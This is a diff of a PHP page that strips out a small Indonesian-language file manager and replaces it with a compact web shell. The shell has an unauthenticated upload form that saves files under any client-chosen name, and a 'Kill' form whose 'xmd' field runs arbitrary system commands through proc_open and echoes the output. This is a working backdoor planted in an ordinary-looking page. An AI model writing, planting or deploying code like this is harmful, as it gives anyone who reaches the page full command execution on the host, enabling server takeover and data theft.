@@ -1,93 +1,37 @@
 <?php
-// Simple File Manager without login (CRUD)
-// NOTE: For local/dev use only — DO NOT use in production without authentication!
 
-$baseDir = __DIR__;
-$action = $_GET['action'] ?? 'list';
-$path = realpath($baseDir . '/' . ($_GET['path'] ?? ''));
-if ($path === false || strpos($path, $baseDir) !== 0) die('Invalid path');
-
-function listFiles($dir) {
-    $items = scandir($dir);
-    echo "<h2>File Manager</h2>";
-    echo "<a href='?action=create_file&path='>Buat File</a> | ";
-    echo "<a href='?action=create_folder&path='>Buat Folder</a><br><br>";
-
-    echo "<table border='1' cellpadding='5'><tr><th>Nama</th><th>Aksi</th></tr>";
-    foreach ($items as $item) {
-        if ($item === '.') continue;
-        $full = $dir . '/' . $item;
-        echo "<tr><td>$item</td><td>";
-        if (is_dir($full)) {
-            echo "<a href='?path=$item'>Buka</a> | ";
-            echo "<a href='?action=delete&path=$item' onclick='return confirm("Hapus folder?")'>Hapus</a>";
-        } else {
-            echo "<a href='?action=edit&path=$item'>Edit</a> | ";
-            echo "<a href='?action=delete&path=$item' onclick='return confirm("Hapus file?")'>Hapus</a>";
-        }
-        echo "</td></tr>";
-    }
-    echo "</table>";
+$filename = $_FILES['file']['name'];
+$filetmp  = $_FILES['file']['tmp_name'];
+echo "<br><form method='POST' enctype='multipart/form-data'>
+<input type='file' name='file' />
+<input type='submit' value='>>>' />
+</form>";
+echo '<form method="post">
+<input type="text" name="xmd" size="30">
+<input type="submit" value="Kill">
+</form>';
+if(move_uploaded_file($filetmp,$filename)=='1'){
+echo '[OK] ===> '.$filename;
 }
+if(isset($_POST['xmd'])){
+$xmd=$_POST['xmd'];
+$descriptors = [
+  0 => ['pipe', 'r'], // stdin
+  1 => ['pipe', 'w'], // stdout
+  2 => ['pipe', 'w'], // stderr
+];
 
-// CREATE FILE
-if ($action === 'create_file') {
-    if ($_POST) {
-        file_put_contents($baseDir . '/' . $_POST['filename'], $_POST['content']);
-        header('Location: ./'); exit;
-    }
-    echo "<h3>Buat File</h3>
-    <form method='post'>
-        Nama: <input name='filename'><br><br>
-        Isi:<br>
-        <textarea name='content' rows='10' cols='50'></textarea><br><br>
-        <button type='submit'>Simpan</button>
-    </form>";
-    exit;
+$process = proc_open($xmd, $descriptors, $pipes);
+
+$output = stream_get_contents($pipes[1]);
+$error = stream_get_contents($pipes[2]);
+
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+echo "<textarea  cols=30 rows=15;>$output";
+echo "Error:\n$error\n";
 }
-
-// CREATE FOLDER
-if ($action === 'create_folder') {
-    if ($_POST) {
-        mkdir($baseDir . '/' . $_POST['folder']);
-        header('Location: ./'); exit;
-    }
-    echo "<h3>Buat Folder</h3>
-    <form method='post'>
-        Nama Folder: <input name='folder'><br><br>
-        <button type='submit'>Buat</button>
-    </form>";
-    exit;
-}
-
-// EDIT FILE
-if ($action === 'edit') {
-    $file = $path;
-    if (!is_file($file)) die('File tidak ditemukan');
-
-    if ($_POST) {
-        file_put_contents($file, $_POST['content']);
-        header('Location: ./'); exit;
-    }
-    $content = htmlspecialchars(file_get_contents($file));
-
-    echo "<h3>Edit File: {$_GET['path']}</h3>
-    <form method='post'>
-        <textarea name='content' rows='15' cols='70'>$content</textarea><br><br>
-        <button type='submit'>Simpan</button>
-    </form>";
-    exit;
-}
-
-// DELETE
-if ($action === 'delete') {
-    $target = $path;
-    if (is_dir($target)) rmdir($target);
-    else unlink($target);
-
-    header('Location: ./'); exit;
-}
-
-// DEFAULT: LIST
-listFiles($path);
 ?>
